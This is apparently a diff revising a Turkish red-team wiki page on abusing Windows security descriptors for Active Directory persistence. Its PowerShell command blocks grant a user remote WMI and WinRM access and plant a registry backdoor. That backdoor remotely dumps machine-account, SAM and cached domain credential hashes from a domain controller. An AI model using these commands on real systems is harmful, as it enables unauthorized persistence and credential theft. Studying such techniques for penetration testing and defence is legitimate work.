@@ -1,44 +1,45 @@
 # Güvenlik Tanımlayıcıları
 
+{% hint style="success" %}
+AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>AWS hacklemeyi sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>
+<summary>HackTricks'i Destekleyin</summary>
 
-HackTricks'ı desteklemenin diğer yolları:
-
-* **Şirketinizi HackTricks'te reklamını görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
-* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
-* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'ı takip edin**.
-* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.
+* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
+* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
+* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.
 
 </details>
+{% endhint %}
 
 ## Güvenlik Tanımlayıcıları
 
-[Dökümantasyondan](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language): Güvenlik Tanımlayıcı Tanım Dili (SDDL), bir güvenlik tanımlayıcısını açıklamak için kullanılan formattır. SDDL, DACL ve SACL için ACE dizelerini kullanır: `ace_türü;ace_bayrakları;izinler;nesne_kılavuzu;miras_alınan_nesne_kılavuzu;hesap_sid;`
+[Belgelerden](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language): Güvenlik Tanımlayıcı Tanım Dili (SDDL), bir güvenlik tanımlayıcısını tanımlamak için kullanılan formatı tanımlar. SDDL, DACL ve SACL için ACE dizelerini kullanır: `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`
 
-**Güvenlik tanımlayıcıları**, bir **nesnenin** üzerinde **sahip olduğu izinleri** depolamak için kullanılır. Bir nesnenin güvenlik tanımlayıcısında sadece küçük bir değişiklik yapabilirseniz, ayrıcalıklı bir gruba üye olmadan o nesne üzerinde çok ilginç ayrıcalıklar elde edebilirsiniz.
+**Güvenlik tanımlayıcıları**, bir **nesnenin** üzerinde sahip olduğu **izinleri** **saklamak** için kullanılır. Eğer bir nesnenin **güvenlik tanımlayıcısında** sadece **küçük bir değişiklik** yapabilirseniz, o nesne üzerinde çok ilginç ayrıcalıklar elde edebilirsiniz, bunun için ayrıcalıklı bir grubun üyesi olmanıza gerek yoktur.
 
-Bu kalıcılık tekniği, genellikle yönetici ayrıcalıklarını gerektiren bir görevi yönetici olmadan gerçekleştirebilmek için belirli nesneler üzerinde gereken her ayrıcalığı kazanma yeteneğine dayanır.
+Bu nedenle, bu kalıcılık tekniği, belirli nesneler üzerinde gereken her ayrıcalığı kazanma yeteneğine dayanır; böylece genellikle admin ayrıcalıkları gerektiren bir görevi admin olmadan gerçekleştirebilirsiniz.
 
-### WMI Erişimi
+### WMI'ye Erişim
 
-Bir kullanıcıya **uzaktan WMI yürütme erişimi** sağlayabilirsiniz [**bunu kullanarak**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1):
+Bir kullanıcıya **uzaktan WMI çalıştırma** erişimi verebilirsiniz [**bunu kullanarak**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1):
 ```bash
 Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
 Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
 ```
 ### WinRM Erişimi
 
-Bir kullanıcıya **winrm PS konsoluna erişim** sağlamak için [**şunu kullanın**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**
+Bir kullanıcıya **winrm PS konsoluna erişim verin** [**bunu kullanarak**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**
 ```bash
 Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
 Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
 ```
-### Hash'lerin Uzaktan Erişimi
+### Hash'lara uzaktan erişim
 
-**Kayıt defterine** erişin ve **hash'leri dökün**, [**DAMP**](https://github.com/HarmJ0y/DAMP) kullanarak bir **Reg arka kapısı oluşturun**, böylece herhangi bir zamanda **bilgisayarın hash'ini**, **SAM**'i ve bilgisayarda önbelleğe alınmış herhangi bir **AD kimlik bilgisini** alabilirsiniz. Bu nedenle, bu izni bir **düzenli kullanıcıya** bir **Etki Alanı Denetleyici bilgisayarı** karşısında vermek çok faydalıdır:
+**Kayıt defterine** erişin ve **hash'leri dökün**, böylece **DAMP** kullanarak bir **Reg arka kapısı oluşturun**, böylece istediğiniz zaman **bilgisayarın hash'ini**, **SAM**'i ve bilgisayardaki herhangi bir **önbelleklenmiş AD** kimlik bilgilerini alabilirsiniz. Bu nedenle, bu izni bir **normal kullanıcıya bir Alan Denetleyici bilgisayarı** karşısında vermek çok faydalıdır:
 ```bash
 # allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
 Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose
@@ -52,20 +53,19 @@ Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose
 # Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
 Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
 ```
-**Güvenlik Tanımlayıcıları**
+Check [**Silver Tickets**](silver-ticket.md) ile bir Domain Controller'ın bilgisayar hesabının hash'ini nasıl kullanabileceğinizi öğrenin.
 
-Bir Etki Alanı Denetleyicisinin bilgisayar hesabının karma değerini nasıl kullanabileceğinizi öğrenmek için [**Gümüş Biletler**](silver-ticket.md)'e bakın.
+{% hint style="success" %}
+AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>AWS hackleme konusunda sıfırdan kahramana dönüşün</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile öğrenin!</strong></summary>
+<summary>HackTricks'i Destekleyin</summary>
 
-HackTricks'i desteklemenin diğer yolları:
-
-* Şirketinizi HackTricks'te **reklamınızı görmek** veya HackTricks'i **PDF olarak indirmek** için [**ABONELİK PLANLARINA**](https://github.com/sponsors/carlospolop) göz atın!
-* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keşfedin
-* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
-* Hacking hilelerinizi **HackTricks** ve **HackTricks Cloud** github depolarına PR göndererek paylaşın.
+* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
+* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
+* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.
 
 </details>
+{% endhint %}
